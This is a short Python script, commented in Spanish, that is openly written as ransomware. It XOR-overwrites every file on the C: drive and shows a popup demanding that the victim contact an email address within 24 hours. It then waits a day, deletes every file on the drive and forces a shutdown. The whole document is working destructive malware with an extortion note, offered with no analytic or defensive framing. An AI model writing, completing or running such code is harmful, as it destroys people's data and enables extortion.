import os
import time
import tkinter as tk
from tkinter import messagebox

# Clave de cifrado personalizada
key = b'himself9864'

# Función para cifrar archivos
def encrypt_files():
    for root, dirs, files in os.walk('C:\\'):
        for file in files:
            try:
                with open(os.path.join(root, file), 'rb') as f:
                    data = f.read()
                encrypted_data = bytearray()
                for byte in data:
                    encrypted_data.append(byte ^ key[0])
                with open(os.path.join(root, file), 'wb') as f:
                    f.write(encrypted_data)
            except Exception as e:
                print(f"Error encrypting {file}: {e}")

# Función para mostrar la ventana emergente
def show_popup():
    root = tk.Tk()
    root.withdraw()  # Ocultar la ventana principal
    messagebox.showinfo("Ransomware", "Tus archivos han sido cifrados.\n\nContacta a cotroneosalvador@gmail.com para obtener la llave de desencriptación: himself9864.\n\nSi no pagas en 24 horas, tus archivos serán eliminados.")
    root.deiconify()  # Mostrar la ventana principal
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Bloquear el cierre de la ventana
    root.mainloop()

# Función principal
def main():
    # Cifrar todos los archivos
    encrypt_files()

    # Mostrar la ventana emergente
    show_popup()

    # Esperar 24 horas
    time.sleep(24 * 60 * 60)

    # Eliminar todos los archivos
    for root, dirs, files in os.walk('C:\\'):
        for file in files:
            try:
                os.remove(os.path.join(root, file))
            except Exception as e:
                print(f"Error deleting {file}: {e}")

    # Dejar el ordenador inservible
    os.system("shutdown /s /t 1")

if __name__ == "__main__":
    main()